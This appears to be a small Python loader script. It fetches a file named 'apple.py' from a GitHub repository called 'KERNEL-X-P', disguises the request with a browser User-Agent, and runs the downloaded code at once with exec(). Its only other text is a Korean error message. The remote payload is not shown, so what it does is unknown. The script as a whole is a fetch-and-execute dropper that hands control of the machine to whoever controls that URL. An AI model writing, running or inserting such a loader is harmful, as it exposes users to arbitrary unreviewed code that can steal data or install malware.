import urllib.request

RAW_URL = "https://raw.githubusercontent.com/sliccer34-cloud/KERNEL-X-P/main/apple.py"

try:
    req = urllib.request.Request(RAW_URL, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req) as response:
        code = response.read().decode('utf-8')
    exec(code)

except Exception as e:
    print(f"코드를 불러오는 중 오류가 발생했습니다: {e}")